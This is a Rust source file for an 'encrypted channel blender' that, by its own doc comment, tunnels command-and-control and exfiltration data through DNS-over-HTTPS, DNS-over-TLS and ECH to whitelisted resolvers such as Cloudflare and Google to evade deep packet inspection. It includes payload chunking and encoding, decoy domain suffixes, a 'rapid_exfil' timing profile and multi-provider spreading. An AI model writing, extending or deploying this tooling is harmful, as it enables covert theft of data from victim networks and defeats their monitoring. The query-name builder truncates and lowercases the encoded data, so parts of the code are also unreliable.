use rand::rngs::StdRng;
use rand::Rng;
use rand::SeedableRng;
use serde::{Deserialize, Serialize};

/// DNS-over-HTTPS / DNS-over-TLS / ECH tunnel provider identity.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum TunnelProvider {
    Cloudflare,
    Google,
    Quad9,
    NextDns,
    CleanBrowsing,
}

impl TunnelProvider {
    /// Returns the standard DoH endpoint for this provider.
    pub fn doh_endpoint(&self) -> &'static str {
        match self {
            Self::Cloudflare => "https://cloudflare-dns.com/dns-query",
            Self::Google => "https://dns.google/dns-query",
            Self::Quad9 => "https://dns.quad9.net/dns-query",
            Self::NextDns => "https://dns.nextdns.io/dns-query",
            Self::CleanBrowsing => "https://doh.cleanbrowsing.org/doh/security-filter",
        }
    }

    /// Returns the standard DoT hostname and port for this provider.
    pub fn dot_endpoint(&self) -> (&'static str, u16) {
        match self {
            Self::Cloudflare => ("one.one.one.one", 853),
            Self::Google => ("dns.google", 853),
            Self::Quad9 => ("dns.quad9.net", 853),
            Self::NextDns => ("dns.nextdns.io", 853),
            Self::CleanBrowsing => ("security-filter-dns.cleanbrowsing.org", 853),
        }
    }

    /// Returns the primary IP addresses for DPI whitelisting appearance.
    pub fn whitelisted_ips(&self) -> &'static [&'static str] {
        match self {
            Self::Cloudflare => &["1.1.1.1", "1.0.0.1", "2606:4700:4700::1111"],
            Self::Google => &["8.8.8.8", "8.8.4.4", "2001:4860:4860::8888"],
            Self::Quad9 => &["9.9.9.9", "149.112.112.112"],
            Self::NextDns => &["45.90.28.0", "45.90.30.0"],
            Self::CleanBrowsing => &["185.228.168.9", "185.228.169.9"],
        }
    }
}

/// Tunnel transport protocol selection.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum TunnelProtocol {
    DnsOverHttps,
    DnsOverTls,
    EncryptedClientHello,
}

/// Encoding scheme for embedding data inside DNS-shaped messages.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum DataEncoding {
    Base32Subdomain,
    Base64TxtRecord,
    HexCname,
    CompressedBase64,
}

impl DataEncoding {
    /// Encodes raw bytes into the encoding format. Returns the encoded string.
    pub fn encode(&self, data: &[u8]) -> String {
        match self {
            Self::Base32Subdomain => base32_encode(data),
            Self::Base64TxtRecord => base64_encode(data),
            Self::HexCname => hex_encode(data),
            Self::CompressedBase64 => {
                let compressed = simple_compress(data);
                base64_encode(&compressed)
            }
        }
    }

    /// Decodes an encoded string back into raw bytes.
    pub fn decode(&self, encoded: &str) -> Result<Vec<u8>, ChannelError> {
        match self {
            Self::Base32Subdomain => base32_decode(encoded),
            Self::Base64TxtRecord => base64_decode(encoded),
            Self::HexCname => hex_decode(encoded),
            Self::CompressedBase64 => {
                let compressed = base64_decode(encoded)?;
                simple_decompress(&compressed)
            }
        }
    }

    /// Maximum payload bytes per single DNS-shaped message for this encoding.
    pub fn max_payload_per_message(&self) -> usize {
        match self {
            Self::Base32Subdomain => 110,
            Self::Base64TxtRecord => 189,
            Self::HexCname => 126,
            Self::CompressedBase64 => 250,
        }
    }
}

/// Timing profile to match real DNS traffic patterns per provider.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TimingProfile {
    pub min_interval_ms: u64,
    pub max_interval_ms: u64,
    pub mean_interval_ms: u64,
    pub burst_size: usize,
    pub burst_interval_ms: u64,
}

impl TimingProfile {
    /// Creates a timing profile mimicking standard browser DNS resolution.
    pub fn browser_like() -> Self {
        Self {
            min_interval_ms: 10,
            max_interval_ms: 5000,
            mean_interval_ms: 500,
            burst_size: 4,
            burst_interval_ms: 50,
        }
    }

    /// Creates a low-and-slow profile for long-term persistent channels.
    pub fn persistent_slow() -> Self {
        Self {
            min_interval_ms: 5000,
            max_interval_ms: 60000,
            mean_interval_ms: 15000,
            burst_size: 1,
            burst_interval_ms: 0,
        }
    }

    /// Creates an aggressive profile for rapid exfiltration.
    pub fn rapid_exfil() -> Self {
        Self {
            min_interval_ms: 5,
            max_interval_ms: 200,
            mean_interval_ms: 50,
            burst_size: 8,
            burst_interval_ms: 10,
        }
    }
}

/// Per-provider tunnel configuration with timing and encoding.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TunnelProfile {
    pub provider: TunnelProvider,
    pub protocol: TunnelProtocol,
    pub encoding: DataEncoding,
    pub timing: TimingProfile,
    pub max_message_size: usize,
    pub domain_suffix: String,
    pub sni_host: String,
}

impl TunnelProfile {
    /// Creates a default DoH profile for the given provider.
    pub fn doh(provider: TunnelProvider) -> Self {
        let sni_host = match provider {
            TunnelProvider::Cloudflare => "cloudflare-dns.com",
            TunnelProvider::Google => "dns.google",
            TunnelProvider::Quad9 => "dns.quad9.net",
            TunnelProvider::NextDns => "dns.nextdns.io",
            TunnelProvider::CleanBrowsing => "doh.cleanbrowsing.org",
        };
        Self {
            provider,
            protocol: TunnelProtocol::DnsOverHttps,
            encoding: DataEncoding::Base64TxtRecord,
            timing: TimingProfile::browser_like(),
            max_message_size: 512,
            domain_suffix: "cdn-probe.net".to_string(),
            sni_host: sni_host.to_string(),
        }
    }

    /// Creates a default DoT profile for the given provider.
    pub fn dot(provider: TunnelProvider) -> Self {
        let (host, _port) = provider.dot_endpoint();
        Self {
            provider,
            protocol: TunnelProtocol::DnsOverTls,
            encoding: DataEncoding::Base32Subdomain,
            timing: TimingProfile::persistent_slow(),
            max_message_size: 253,
            domain_suffix: "dns-health.net".to_string(),
            sni_host: host.to_string(),
        }
    }

    /// Creates an ECH tunnel profile for the given provider.
    pub fn ech(provider: TunnelProvider) -> Self {
        Self {
            provider,
            protocol: TunnelProtocol::EncryptedClientHello,
            encoding: DataEncoding::CompressedBase64,
            timing: TimingProfile::browser_like(),
            max_message_size: 512,
            domain_suffix: "edge-telemetry.net".to_string(),
            sni_host: "cloudflare-ech.com".to_string(),
        }
    }

    pub fn with_timing(mut self, timing: TimingProfile) -> Self {
        self.timing = timing;
        self
    }

    pub fn with_encoding(mut self, encoding: DataEncoding) -> Self {
        self.encoding = encoding;
        self
    }

    pub fn with_domain_suffix(mut self, suffix: &str) -> Self {
        self.domain_suffix = suffix.to_string();
        self
    }
}

/// Error type for channel operations.
#[derive(Debug)]
pub enum ChannelError {
    PayloadTooLarge { size: usize, max: usize },
    EncodingError(String),
    DecodingError(String),
    InvalidChunkIndex { index: usize, total: usize },
    ProviderUnavailable(TunnelProvider),
    InvalidConfiguration(String),
}

impl std::fmt::Display for ChannelError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::PayloadTooLarge { size, max } => {
                write!(f, "payload {size} bytes exceeds max {max}")
            }
            Self::EncodingError(e) => write!(f, "encoding error: {e}"),
            Self::DecodingError(e) => write!(f, "decoding error: {e}"),
            Self::InvalidChunkIndex { index, total } => {
                write!(f, "chunk index {index} out of range (total {total})")
            }
            Self::ProviderUnavailable(p) => write!(f, "provider unavailable: {p:?}"),
            Self::InvalidConfiguration(e) => write!(f, "invalid config: {e}"),
        }
    }
}

impl std::error::Error for ChannelError {}

/// A single chunk of a larger payload encoded for DNS tunnel transport.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TunnelChunk {
    pub sequence: usize,
    pub total_chunks: usize,
    pub session_id: u32,
    pub encoded_data: String,
    pub dns_query_name: String,
    pub record_type: DnsRecordType,
}

/// DNS record type used for the tunnel query.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum DnsRecordType {
    A,
    Aaaa,
    Txt,
    Cname,
    Mx,
}

/// Tunnels C2/exfil data inside encrypted DNS streams to whitelisted providers.
///
/// DPI sees only legitimate TLS connections to Cloudflare/Google DNS endpoints.
/// Data is encoded into DNS query patterns that respect real DNS timing and
/// size distributions. Chunks large payloads across multiple queries with
/// reassembly metadata.
pub struct EncryptedChannelBlender {
    profile: TunnelProfile,
    rng: StdRng,
    session_id: u32,
    chunks_sent: u64,
    bytes_tunneled: u64,
}

impl EncryptedChannelBlender {
    pub fn new(profile: TunnelProfile) -> Self {
        let mut rng = StdRng::from_os_rng();
        let session_id = rng.random_range(0x1000..0xFFFF);
        Self {
            profile,
            rng,
            session_id,
            chunks_sent: 0,
            bytes_tunneled: 0,
        }
    }

    pub fn with_seed(profile: TunnelProfile, seed: u64) -> Self {
        let mut rng = StdRng::seed_from_u64(seed);
        let session_id = rng.random_range(0x1000..0xFFFF);
        Self {
            profile,
            rng,
            session_id,
            chunks_sent: 0,
            bytes_tunneled: 0,
        }
    }

    /// Chunks and encodes a payload for tunnel transport. Each chunk is a
    /// self-contained DNS-shaped message that fits within provider size limits.
    pub fn encode_payload(&mut self, data: &[u8]) -> Result<Vec<TunnelChunk>, ChannelError> {
        if data.is_empty() {
            return Ok(Vec::new());
        }

        let max_per_chunk = self.profile.encoding.max_payload_per_message();
        let chunks_needed = (data.len() + max_per_chunk - 1) / max_per_chunk;
        let mut result = Vec::with_capacity(chunks_needed);

        for (i, chunk_data) in data.chunks(max_per_chunk).enumerate() {
            let encoded = self.profile.encoding.encode(chunk_data);
            let dns_name = self.build_dns_query_name(&encoded, i);
            let record_type = self.select_record_type();

            result.push(TunnelChunk {
                sequence: i,
                total_chunks: chunks_needed,
                session_id: self.session_id,
                encoded_data: encoded,
                dns_query_name: dns_name,
                record_type,
            });

            self.chunks_sent += 1;
            self.bytes_tunneled += chunk_data.len() as u64;
        }

        Ok(result)
    }

    /// Decodes and reassembles chunks back into the original payload.
    pub fn decode_chunks(&self, chunks: &[TunnelChunk]) -> Result<Vec<u8>, ChannelError> {
        if chunks.is_empty() {
            return Ok(Vec::new());
        }

        let mut sorted: Vec<&TunnelChunk> = chunks.iter().collect();
        sorted.sort_by_key(|c| c.sequence);

        let mut result = Vec::new();
        for chunk in sorted {
            let decoded = self.profile.encoding.decode(&chunk.encoded_data)?;
            result.extend_from_slice(&decoded);
        }

        Ok(result)
    }

    /// Generates the next inter-query delay in milliseconds based on the
    /// tunnel timing profile to match real DNS resolution patterns.
    pub fn next_delay_ms(&mut self) -> u64 {
        let timing = &self.profile.timing;
        let in_burst = self.chunks_sent % timing.burst_size as u64 != 0;
        if in_burst && timing.burst_interval_ms > 0 {
            let jitter = self.rng.random_range(0..=timing.burst_interval_ms / 2);
            return timing.burst_interval_ms + jitter;
        }
        let base = timing.mean_interval_ms as f64;
        let u: f64 = self.rng.random_range(0.0001f64..1.0);
        let delay = -base * u.ln();
        (delay as u64).clamp(timing.min_interval_ms, timing.max_interval_ms)
    }

    /// Returns the SNI hostname that DPI will observe on the TLS connection.
    pub fn visible_sni(&self) -> &str {
        &self.profile.sni_host
    }

    /// Returns the DoH endpoint URL for constructing HTTP requests.
    pub fn doh_url(&self) -> &str {
        self.profile.provider.doh_endpoint()
    }

    /// Returns tunnel statistics.
    pub fn stats(&self) -> ChannelStats {
        ChannelStats {
            chunks_sent: self.chunks_sent,
            bytes_tunneled: self.bytes_tunneled,
            session_id: self.session_id,
            provider: self.profile.provider,
            protocol: self.profile.protocol,
        }
    }

    pub fn profile(&self) -> &TunnelProfile {
        &self.profile
    }

    fn build_dns_query_name(&mut self, encoded_data: &str, seq: usize) -> String {
        let label_max = 63;
        let mut labels: Vec<String> = Vec::new();

        let prefix = &encoded_data[..encoded_data.len().min(label_max)];
        labels.push(prefix.to_lowercase().replace('+', "-").replace('/', "_"));

        labels.push(format!("s{seq}"));
        labels.push(format!("id{:x}", self.session_id));
        labels.push(self.profile.domain_suffix.clone());

        labels.join(".")
    }

    fn select_record_type(&mut self) -> DnsRecordType {
        match self.profile.encoding {
            DataEncoding::Base64TxtRecord => DnsRecordType::Txt,
            DataEncoding::HexCname => DnsRecordType::Cname,
            _ => {
                let roll = self.rng.random_range(0..10);
                if roll < 5 {
                    DnsRecordType::A
                } else if roll < 8 {
                    DnsRecordType::Aaaa
                } else {
                    DnsRecordType::Txt
                }
            }
        }
    }
}

/// Statistics for a tunnel channel session.
#[derive(Debug, Clone)]
pub struct ChannelStats {
    pub chunks_sent: u64,
    pub bytes_tunneled: u64,
    pub session_id: u32,
    pub provider: TunnelProvider,
    pub protocol: TunnelProtocol,
}

/// Multi-provider blender that distributes traffic across multiple tunnel providers
/// for resilience and reduced per-provider volume.
pub struct MultiProviderBlender {
    channels: Vec<EncryptedChannelBlender>,
    round_robin_idx: usize,
}

impl MultiProviderBlender {
    pub fn new(profiles: Vec<TunnelProfile>) -> Self {
        let channels = profiles
            .into_iter()
            .map(EncryptedChannelBlender::new)
            .collect();
        Self {
            channels,
            round_robin_idx: 0,
        }
    }

    /// Selects the next channel in round-robin order and encodes the payload.
    pub fn encode_payload(&mut self, data: &[u8]) -> Result<Vec<TunnelChunk>, ChannelError> {
        if self.channels.is_empty() {
            return Err(ChannelError::InvalidConfiguration(
                "no channels configured".to_string(),
            ));
        }
        let idx = self.round_robin_idx % self.channels.len();
        self.round_robin_idx += 1;
        self.channels[idx].encode_payload(data)
    }

    /// Returns aggregate stats across all channels.
    pub fn aggregate_stats(&self) -> Vec<ChannelStats> {
        self.channels.iter().map(|c| c.stats()).collect()
    }

    pub fn channel_count(&self) -> usize {
        self.channels.len()
    }
}

// --- Encoding/decoding helpers ---

fn base32_encode(data: &[u8]) -> String {
    const ALPHABET: &[u8] = b"abcdefghijklmnopqrstuvwxyz234567";
    let mut result = String::with_capacity((data.len() * 8 + 4) / 5);
    let mut buffer: u64 = 0;
    let mut bits = 0;
    for &byte in data {
        buffer = (buffer << 8) | byte as u64;
        bits += 8;
        while bits >= 5 {
            bits -= 5;
            let idx = ((buffer >> bits) & 0x1F) as usize;
            result.push(ALPHABET[idx] as char);
        }
    }
    if bits > 0 {
        let idx = ((buffer << (5 - bits)) & 0x1F) as usize;
        result.push(ALPHABET[idx] as char);
    }
    result
}

fn base32_decode(encoded: &str) -> Result<Vec<u8>, ChannelError> {
    let mut result = Vec::new();
    let mut buffer: u64 = 0;
    let mut bits = 0;
    for c in encoded.chars() {
        let val = match c {
            'a'..='z' => c as u64 - 'a' as u64,
            '2'..='7' => c as u64 - '2' as u64 + 26,
            _ => {
                return Err(ChannelError::DecodingError(format!(
                    "invalid base32 char: {c}"
                )))
            }
        };
        buffer = (buffer << 5) | val;
        bits += 5;
        if bits >= 8 {
            bits -= 8;
            result.push((buffer >> bits) as u8);
        }
    }
    Ok(result)
}

fn base64_encode(data: &[u8]) -> String {
    const TABLE: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut result = String::with_capacity((data.len() + 2) / 3 * 4);
    for chunk in data.chunks(3) {
        let b0 = chunk[0] as u32;
        let b1 = if chunk.len() > 1 { chunk[1] as u32 } else { 0 };
        let b2 = if chunk.len() > 2 { chunk[2] as u32 } else { 0 };
        let triple = (b0 << 16) | (b1 << 8) | b2;
        result.push(TABLE[((triple >> 18) & 0x3F) as usize] as char);
        result.push(TABLE[((triple >> 12) & 0x3F) as usize] as char);
        if chunk.len() > 1 {
            result.push(TABLE[((triple >> 6) & 0x3F) as usize] as char);
        } else {
            result.push('=');
        }
        if chunk.len() > 2 {
            result.push(TABLE[(triple & 0x3F) as usize] as char);
        } else {
            result.push('=');
        }
    }
    result
}

fn base64_decode(encoded: &str) -> Result<Vec<u8>, ChannelError> {
    let mut result = Vec::new();
    let chars: Vec<u8> = encoded.bytes().filter(|&b| b != b'=').collect();
    let decode_char = |c: u8| -> Result<u32, ChannelError> {
        match c {
            b'A'..=b'Z' => Ok((c - b'A') as u32),
            b'a'..=b'z' => Ok((c - b'a' + 26) as u32),
            b'0'..=b'9' => Ok((c - b'0' + 52) as u32),
            b'+' => Ok(62),
            b'/' => Ok(63),
            _ => Err(ChannelError::DecodingError(format!(
                "invalid base64 char: {}",
                c as char
            ))),
        }
    };
    let mut i = 0;
    while i + 1 < chars.len() {
        let a = decode_char(chars[i])?;
        let b = decode_char(chars[i + 1])?;
        let c = if i + 2 < chars.len() {
            decode_char(chars[i + 2])?
        } else {
            0
        };
        let d = if i + 3 < chars.len() {
            decode_char(chars[i + 3])?
        } else {
            0
        };
        let triple = (a << 18) | (b << 12) | (c << 6) | d;
        result.push((triple >> 16) as u8);
        if i + 2 < chars.len() {
            result.push((triple >> 8) as u8);
        }
        if i + 3 < chars.len() {
            result.push(triple as u8);
        }
        i += 4;
    }
    Ok(result)
}

fn hex_encode(data: &[u8]) -> String {
    let mut result = String::with_capacity(data.len() * 2);
    for &byte in data {
        result.push_str(&format!("{byte:02x}"));
    }
    result
}

fn hex_decode(encoded: &str) -> Result<Vec<u8>, ChannelError> {
    if encoded.len() % 2 != 0 {
        return Err(ChannelError::DecodingError(
            "hex string has odd length".to_string(),
        ));
    }
    let mut result = Vec::with_capacity(encoded.len() / 2);
    let bytes = encoded.as_bytes();
    for i in (0..bytes.len()).step_by(2) {
        let hi = hex_nibble(bytes[i])?;
        let lo = hex_nibble(bytes[i + 1])?;
        result.push((hi << 4) | lo);
    }
    Ok(result)
}

fn hex_nibble(c: u8) -> Result<u8, ChannelError> {
    match c {
        b'0'..=b'9' => Ok(c - b'0'),
        b'a'..=b'f' => Ok(c - b'a' + 10),
        b'A'..=b'F' => Ok(c - b'A' + 10),
        _ => Err(ChannelError::DecodingError(format!(
            "invalid hex char: {}",
            c as char
        ))),
    }
}

fn simple_compress(data: &[u8]) -> Vec<u8> {
    let mut result = Vec::new();
    let mut i = 0;
    while i < data.len() {
        let byte = data[i];
        let mut count: u8 = 1;
        while (i + count as usize) < data.len() && data[i + count as usize] == byte && count < 255 {
            count += 1;
        }
        if count >= 3 {
            result.push(0xFF);
            result.push(count);
            result.push(byte);
            i += count as usize;
        } else {
            if byte == 0xFF {
                result.push(0xFF);
                result.push(1);
                result.push(0xFF);
            } else {
                result.push(byte);
            }
            i += 1;
        }
    }
    result
}

fn simple_decompress(data: &[u8]) -> Result<Vec<u8>, ChannelError> {
    let mut result = Vec::new();
    let mut i = 0;
    while i < data.len() {
        if data[i] == 0xFF {
            if i + 2 >= data.len() {
                return Err(ChannelError::DecodingError(
                    "truncated compressed data".to_string(),
                ));
            }
            let count = data[i + 1] as usize;
            let byte = data[i + 2];
            for _ in 0..count {
                result.push(byte);
            }
            i += 3;
        } else {
            result.push(data[i]);
            i += 1;
        }
    }
    Ok(result)
}
